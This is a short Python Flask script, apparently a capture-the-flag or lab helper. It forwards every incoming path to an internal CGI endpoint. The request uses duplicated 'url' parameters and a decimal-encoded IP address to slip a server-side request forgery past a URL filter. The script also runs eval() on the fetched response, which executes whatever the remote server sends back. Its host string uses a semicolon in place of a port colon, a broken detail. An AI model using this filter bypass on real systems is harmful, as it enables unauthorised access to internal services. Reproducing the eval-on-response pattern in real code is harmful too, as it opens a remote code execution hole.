#!/usr/bin/env python
from flask import Flask, abort
import urlparse
import requests

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    url = "http://10.10.0.3;4444/cgi-bin/index.py?url=%20&url=http://185207299/{}".format(path)
    resp = requests.get(url)
    try:
        resp_text = eval(resp.text)
    except:
        resp_text = resp.text
        
    if not resp_text or resp_text in ['\n', '\r', '\r\n']:
        abort(404)

    out = resp_text
    return out

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=5001)
